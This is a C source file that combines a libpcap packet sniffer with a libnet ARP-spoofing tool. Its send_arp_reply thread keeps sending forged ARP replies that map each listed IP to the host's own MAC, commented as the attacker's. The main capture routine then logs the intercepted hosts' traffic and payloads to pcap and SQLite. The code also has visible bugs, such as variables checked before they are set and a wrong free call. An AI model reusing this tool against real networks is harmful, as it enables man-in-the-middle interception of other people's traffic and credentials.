#include<stdio.h>
#include<stdlib.h>
#include<pcap/pcap.h>
#include<arpa/inet.h>
#include"ethernet.h"
#include<ctype.h>
#include<time.h>
#include<libnet.h>
#include<string.h>
#include<unistd.h>
#include<sqlite3.h>
#include<net/if.h>
#include<arpa/inet.h>
#include<pthread.h>
#define SIZE_ETHERNET 14
#define PACKETS_NUMBERS 50

#define ARP_REQUEST 1
#define ARP_REPLY   2

#define MAX_IP_NUM 100

void analyze_packets(u_char *args, const struct pcap_pkthdr *header,const u_char *packet);
void call_arp_spoof(const u_char* packet);
int  send_arp(u_int8_t* dst_ip_str,char* device);
void*  send_arp_reply(void*);
void insert_databases();
char errbuf[PCAP_ERRBUF_SIZE];
char* get_ip(char* device);//得到主机IP MAC
int get_mac(char* device,u_int8_t* src_mac);
int send_packets();//用于数据包转发
struct ip_mac ip_form[MAX_IP_NUM];
int ip_num;
char* device;
int main()
{
    pcap_if_t*  alldevsp=NULL;
    ip_num=0;
    FILE* fp_ip=fopen("ip_form","r");
    FILE* fp=fopen("log","at+");//日志文件
    FILE* filter=fopen("filter","r");//过滤规则文件
    char filter_str[200];
    int ret=0;
//将表格数据存入结构体数组供以后使用
    while(!feof(fp_ip))
    {
	    fgets(ip_form[ip_num].ip,17,fp_ip);
	    if(ip_form[ip_num].ip[strlen(ip_form[ip_num].ip)-1]=='\n')
            	ip_form[ip_num].ip[strlen(ip_form[ip_num].ip)-1]='\0';//去除表中\n字符
	    ip_num++;
    }
    ip_num--;
    device=pcap_lookupdev(errbuf);//device是设备名
    if(device)
    {
	    fprintf(fp,"name is %s\n",device);
	    printf("open device success %s\n",device);
    }
    else
    {
	    fprintf(fp,"open device failure\n");
	    exit(1);
    }

    pcap_t* handle=NULL;
    handle=pcap_open_live(device,65535,1,0,errbuf);
    if(handle)
    {
	fprintf(fp,"pcap_open_live success\n");
        printf("pcap_open_live success\n");
    }
    else
    {
        printf("open_live error%s\n",errbuf);
        exit(1);
    }

    pcap_dumper_t* dumpfp;
    dumpfp=pcap_dump_open(handle,"dump.pcap");//用于保存日志文件
    if(dumpfp==NULL)
    {
	    fprintf(fp,"No dump.pcap\n");
	    exit(1);
    }

    bpf_u_int32 netp,maskp;
    char* net,*mask;
    struct in_addr addr;
    ret=pcap_lookupnet(device,&netp,&maskp,errbuf);
    if(!ret)
    {
        printf("call pcap_lookupnet success\n");
        fprintf(fp,"call pcap_lookupnet success\n");
    }
    else
    {
        printf("lookupnet error%s\n",errbuf);
        fprintf(fp,"call pcap_lookupnet failure\n");
        exit(1);
    }

    addr.s_addr=netp;
    net=inet_ntoa(addr);
    if(net==NULL)
    {
	    printf("ip error\n");
	    exit(0);
    }
    else
    {
	    printf("ip %s\n",net);
    }

    u_int8_t mac_shost[6];
    if(get_mac(device,mac_shost)==0)
    {
	     printf("host mac:%02x %02x %02x %02x %02x %02x\n",
                    mac_shost[0]&0xff,
                    mac_shost[1]&0xff,
                    mac_shost[2]&0xff,
                    mac_shost[3]&0xff,
                    mac_shost[4]&0xff,
                    mac_shost[5]&0xff);

    }

    u_int8_t* ip_host=(u_int8_t*) get_ip(device);
    if(ip_host!=NULL)
    {
	    printf("host ip %s\n",ip_host);
    }


    addr.s_addr=maskp;
    mask=inet_ntoa(addr);
    if(mask==NULL)
    {
	    printf("ip error\n");
	    exit(0);
    }
    else
    {
	    printf("mask is%s\n",mask);
    }
    
    if(fgets(filter_str,199,filter)==NULL)
    {
	    fprintf(fp,"OPEN FILTER FAILURE\n");
	    printf("OPEN FILTER FAILURE\n");
	    exit(1);
    }

    struct bpf_program f;
    if(pcap_compile(handle,&f,filter_str,0,netp)==-1)
    {
	    fprintf(fp,"COMPILE ERROE\n");
	    printf("COMPILE ERROR\n");
	    exit(1);
    }

    if(pcap_setfilter(handle,&f)==-1)
    {
	    fprintf(fp,"SETFILTER ERROR\n");
	    printf("SETFILTER ERROR\n");
	    exit(1);
    }

    for(int i=0;i<ip_num;i++)
    {
	    u_int8_t* dst_ip_str = (u_int8_t*) ip_form[i].ip;
	    send_arp(dst_ip_str,device);
    }
    pthread_t thread;
    if(pthread_create(&thread,NULL,send_arp_reply,NULL)==-1)
    {
	    printf("creat thread failure\n");
    }

    ret=pcap_loop(handle,PACKETS_NUMBERS,analyze_packets,(u_char *)dumpfp);
    if(ret==0)
    {
	    fprintf(fp,"pcap_loop success\n");
	    printf("pcap_loop success\n");

    }
    else
    {
	    fprintf(fp,"pcap_loop failure\n");
	    printf("pcap_loop failure\n");

    }

    pthread_cancel(thread);
    pcap_dump_close(dumpfp);

    pcap_freealldevs(alldevsp);
    fclose(fp);
    fclose(filter);
    fclose(fp_ip);
    printf("CODE OVER\n");
    return 0;
}

void analyze_packets(u_char *args, const struct pcap_pkthdr *header,const u_char *packet)
{
   
    const struct mac_header *ethernet=NULL;
    const struct ip_header  *ip=NULL;
    const struct tcp_header *tcp=NULL;
    const struct arp_header *arp=NULL;
    const unsigned char* payload=NULL;
    sqlite3* db;
    char* sql;
    int ret;
    ret = sqlite3_open("packet.db",&db);
    if(ret)
    {
	    exit(1);
    }

    printf("********************************************\n");
    pcap_dump(args,header,packet);
    ethernet = (struct mac_header*)(packet);
    
    switch(ntohs(ethernet->mac_type)){
	    case 0x0800:printf("IP PACKET\n");break;
	    case 0x0806:printf("ARP PACKET\n");break;
	    case 0x8035:printf("RARP PACKET\n");break;
    }
    if(ntohs(ethernet->mac_type)==0x0800)
    {
    	ip=(struct ip_header*)(packet+14);
    	static unsigned int tcp_num=0,icmp_num=0,udp_num=0;//个数据包捕获的数量 
  //     unsigned int paclen = header->len;//解析出包长度
  //	  unsigned pacaplen=header->caplen;//解析出包字节数
    	char* strtime=ctime((const time_t*)&header->ts.tv_sec);//捕获时间
    	static unsigned int count=0;
    	static double packet_count=0;//每秒数据包数量
    	static unsigned int packets_len=0;//总流量
  //	  static unsigned int tick_count=0;//时间起点
  //	  static double speed=0.0;//流量传输速度
    	packets_len+=header->len;
    	packet_count++;

    	switch(ip->ip_p){
    	        case IPPROTO_TCP:
    	    	    printf("TCP 协议\n");
    	    	    tcp_num++;
    	    	    break;
    	        case IPPROTO_UDP:
    	    	    printf("UDP 协议\n");
    	    	    udp_num++;
    	    	    break;
    	   	   case IPPROTO_ICMP:
    	    	    printf("ICMP 协议\n");
    	    	    icmp_num++;
    	}
    	
    	tcp=(struct tcp_header*)(packet+14+20);
    	
    	printf("捕获时间    : %s\n",strtime); 
    	printf("mac目的地址：%02x %02x %02x %02x %02x %02x\n",
    	    	    ethernet->mac_dhost[0],
    	    	    ethernet->mac_dhost[1],
    	    	    ethernet->mac_dhost[2],
    	    	    ethernet->mac_dhost[3],
    	    	    ethernet->mac_dhost[4],
    	    	    ethernet->mac_dhost[5]);
    	printf("mac源地址   :%02x %02x %02x %02x %02x %02x\n",
    	    	    ethernet->mac_shost[0],
    	    	    ethernet->mac_shost[1],
    	    	    ethernet->mac_shost[2],
    	    	    ethernet->mac_shost[3],
    	    	    ethernet->mac_shost[4],
    	    	    ethernet->mac_shost[5]); 

    	printf("源IP地址   ：%s\n",inet_ntoa(ip->ip_src));
    	printf("目的IP地址 ：%s\n",inet_ntoa(ip->ip_dst));


    	printf("源端口     :%d\n",ntohs(tcp->th_sport));
    	printf("目的端口   :%d\n",ntohs(tcp->th_dport));
    	printf("Tcp数据包数量%d\tudp数据包数量%d\ticmp数据包数量%d\n",tcp_num,udp_num,icmp_num);
	
  	  unsigned int size_tcp=TH_OFF(tcp)*4;
  	  payload=(u_char*)(packet+14+20+size_tcp);
  	 const u_char *ch=payload;
  	 const u_char *ch2=payload; 
  	 for(unsigned int i=0;i<header->len;)//
  	 {
  	         for(unsigned int j=0;j<16;j++)
  	         {
  	      	   printf("%02x ",*ch);
  	      	   if(i+j>=header->len)
  	      	   {
  	      		   for(;j<16;j++)
  	      			   printf("   ");
  	      		   ch=NULL;
  	      		   break;
  	      	   }
  	      	   ch++;
  	         }
  	         printf("\t");
  	         for(unsigned int j=0;j<16;j++)
  	         {
  	      	   if(isprint(*ch2))
  	      	   	printf("%c",*ch2);
  	      	   else
  	      		   printf(".");
  	      	   if((i+j)>=header->len)
  	      	   {
  	      		   ch2=NULL;
  	      		   break;
  	      	   }
  	      	   ch2++;
  	         }
  	         printf("\n");
  	         i+=16;
  	 }
  	 sql = sqlite3_mprintf("INSERT INTO PAC VALUES(%d,%d,%d,'%s',%d,%d,'%s','%s',%d)",
  	 count,
  	 header->len,
  	 header->caplen,
  	 strtime,ntohs(tcp->th_sport),
  	 ntohs(tcp->th_dport),
  	 inet_ntoa(ip->ip_src),
  	 inet_ntoa(ip->ip_dst),
  	 ip->ip_p);
  	 ret = sqlite3_exec(db,sql,NULL,NULL,NULL);
  	 if(ret != SQLITE_OK){
  	         fprintf(stderr, "SQL error: %s\n",errbuf);
  	         sqlite3_free(errbuf);
  	         exit(1);
  	 }
  	 else
  	 {
  	         fprintf(stdout, "Operation done successfully\n");
  	 }
    
   	count++;
    }
   	sqlite3_close(db);
   	printf("\n");
    if(ntohs(ethernet->mac_type)==0x0806)
    {
	    arp=(struct arp_header*)(packet+14);
	    printf("操作代码%d\n",ntohs(arp->opcode));
	    printf("mac源地址   :%02x %02x %02x %02x %02x %02x\n",
    	    	    ethernet->mac_shost[0],
    	    	    ethernet->mac_shost[1],
    	    	    ethernet->mac_shost[2],
    	    	    ethernet->mac_shost[3],
    	    	    ethernet->mac_shost[4],
    	    	    ethernet->mac_shost[5]); 
	    printf("mac目的地址：%02x %02x %02x %02x %02x %02x\n",
    	    	    ethernet->mac_dhost[0],
    	    	    ethernet->mac_dhost[1],
    	    	    ethernet->mac_dhost[2],
    	    	    ethernet->mac_dhost[3],
    	    	    ethernet->mac_dhost[4],
    	    	    ethernet->mac_dhost[5]);
           (ntohs(arp->opcode)==2)?printf("REPLY\n"):printf("REQUEST\n");
    	    printf("发送者硬件地址\n:%02x %02x %02x %02x %02x %02x\n",
    	    	    arp->mac_shost[0],
    	    	    arp->mac_shost[1],
    	    	    arp->mac_shost[2],
    	    	    arp->mac_shost[3],
    	    	    arp->mac_shost[4],
    	    	    arp->mac_shost[5]);
    	    printf("目标硬件地址  \n:%02x %02x %02x %02x %02x %02x\n",
    	    	    arp->mac_dhost[0],
    	    	    arp->mac_dhost[1],
    	    	    arp->mac_dhost[2],
    	    	    arp->mac_dhost[3],
    	    	    arp->mac_dhost[4],
    	    	    arp->mac_dhost[5]); 
    	printf("发送者IP地址 ：%d.%d.%d.%d\n",
			arp->ip_src[0],
			arp->ip_src[1],
			arp->ip_src[2],
			arp->ip_src[3]
			);
    	printf("目的IP地址   ：%d.%d.%d.%d\n",
			arp->ip_dst[0],
			arp->ip_dst[1],
			arp->ip_dst[2],
			arp->ip_dst[3]
			);
	for(int i=0;i<ip_num;i++)
	{
		if(strcmp((char*)arp->ip_src,ip_form[i].ip)==0)
		{
			strcpy(ip_form[i].mac,(char*)arp->mac_shost);
		}
	}
    }
}


char* get_ip(char* device)
{
	int sockfd;
	struct sockaddr_in sin;
	struct ifreq ifr;
	sockfd=socket(AF_INET,SOCK_DGRAM,0);
	if(sockfd==-1)
	{
		printf("get ip error\n");
		return NULL;
	}
        strncpy(ifr.ifr_name,device, IFNAMSIZ);      //Interface name

       if (ioctl(sockfd, SIOCGIFADDR, &ifr) == 0) {    //SIOCGIFADDR 获取interface address
      	         memcpy(&sin, &ifr.ifr_addr, sizeof(ifr.ifr_addr));
        	 return inet_ntoa(sin.sin_addr);
        }
	return 0;
}

int get_mac(char* device,u_int8_t* src_mac)
{
	int sockfd;
	struct ifreq ifr;
	sockfd=socket(AF_INET,SOCK_DGRAM,0);
	if(sockfd==-1)
	{
		printf("get mac error\n");
		return (-1);
	}
	strncpy(ifr.ifr_name,device,IFNAMSIZ);
        if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == 0)
	{
		memcpy(src_mac, ifr.ifr_hwaddr.sa_data, 6);
	}
	return 0;
}


int send_arp(u_int8_t* dst_ip_str,char* device)
{

	libnet_t *handle;
	int packet_size;
	u_int8_t src_mac[6];
	get_mac(device,src_mac);//源MAC 本机的MAC
	u_int8_t* src_ip_str=(u_int8_t*) get_ip(device);//源IP 本机的IP
	u_int8_t dst_mac[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};//广播地址 目的MAC
	u_int8_t rev_mac[6]={0x00,0x00,0x00,0x00,0x00,0x00};
	u_int32_t  dst_ip,src_ip;
        libnet_ptag_t arp_proto_tag, eth_proto_tag;

        if ( dst_ip == -1 || src_ip == -1 )
        {
            printf("ip address convert error\n");
            exit(-1);
        }
        /* 初始化Libnet,注意第一个参数和TCP初始化不同 */
        if ( (handle = libnet_init(LIBNET_LINK_ADV, device, errbuf)) == NULL ) 
        {
            printf("libnet_init: error [%s]\n", errbuf);
            exit(-2);
        }
    
        /* 把目的IP地址字符串转化成网络序 */
        dst_ip = libnet_name2addr4(handle,(char*)dst_ip_str, LIBNET_RESOLVE);
        /* 把源IP地址字符串转化成网络序 */
        src_ip = libnet_name2addr4(handle,(char*)src_ip_str, LIBNET_RESOLVE);
    
        /* 构造arp协议块 */
        arp_proto_tag = libnet_build_arp(
                    ARPHRD_ETHER,        /* 硬件类型,1表示以太网硬件地址 */
                    ETHERTYPE_IP,        /* 0x0800表示询问IP地址 */
                    6,                   /* 硬件地址长度 */
                    4,                   /* IP地址长度 */
                    ARPOP_REQUEST,       /* 操作方式:ARP请求 */
                    src_mac,             /* source MAC addr */
                    (u_int8_t *)&src_ip, /* src proto addr */
                    rev_mac,             /* dst MAC addr */
                    (u_int8_t *)&dst_ip, /* dst IP addr */
                    NULL,                /* no payload */
                    0,                   /* payload length */
                    handle,              /* libnet tag */
                    0                    /* Create new one */
        );
    
        if (arp_proto_tag == -1)    {
            printf("build IP failure\n");
            exit(-3);
        }
        eth_proto_tag = libnet_build_ethernet(
            dst_mac,         /* 以太网目的地址 */
            src_mac,         /* 以太网源地址 */
            ETHERTYPE_ARP,   /* 以太网上层协议类型，此时为ARP请求 */
            NULL,            /* 负载，这里为空 */
            0,               /* 负载大小 */
            handle,          /* Libnet句柄 */
            0                /* 协议块标记，0表示构造一个新的 */
        );
        if (eth_proto_tag == -1) {
            printf("build eth_header failure\n");
            return (-4);
        }
        packet_size = libnet_write(handle);    /* 发送已经构造的数据包*/
        if(packet_size);
        libnet_destroy(handle);                /* 释放句柄 */
        return 0;	
}

void*  send_arp_reply(void* a)
{
	while(1)
	{
		libnet_t* handle;
		int packet_size;
		for(int src=0;src<ip_num;src++)
		{
			for(int dst=0;dst<ip_num;dst++)
			{
				if((strcmp((char*)ip_form[src].ip,ip_form[dst].ip)==0))
					continue;
				u_int8_t src_mac[6];//攻击者MAC地址
				get_mac(device,src_mac);
				u_int32_t dst_ip,src_ip;
				libnet_ptag_t arp_proto_tag,eth_proto_tag;
				if(dst_ip==-1||src_ip==-1)
				{
					printf("ip address convert error\n");
				}
				if((handle=libnet_init(LIBNET_LINK_ADV,device,errbuf))==NULL)
				{
					printf("libnet_init:errbuf %s\n",errbuf);
				}
				dst_ip=libnet_name2addr4(handle,ip_form[src].ip,LIBNET_RESOLVE);
				src_ip=libnet_name2addr4(handle,ip_form[dst].ip,LIBNET_RESOLVE);
				arp_proto_tag=libnet_build_arp(
						ARPHRD_ETHER,
						ETHERTYPE_IP,
						6,
						4,
						ARPOP_REPLY,
						src_mac,
						(u_int8_t*)&src_ip,
						(u_int8_t*)ip_form[dst].mac,
						(u_int8_t*)&dst_ip,
						NULL,
						0,
						handle,
						0);
				if(arp_proto_tag==-1)
				{
					printf("build IP failure\n");
				}
				eth_proto_tag=libnet_build_ethernet(
						(u_int8_t*)ip_form[dst].mac,
						src_mac,
						ETHERTYPE_ARP,
						NULL,
						0,
						handle,
						0
						);
				if(eth_proto_tag==-1)
				{
					printf("build eth_header failure\n");
				}
				packet_size=libnet_write(handle);
			        if(packet_size);
				libnet_destroy(handle);
				pthread_testcancel();
			}
		}
	}
}

int send_packets()
{
	libnet_t* net_t=NULL;
	
	libnet_destroy(net_t);
	return 0;
}






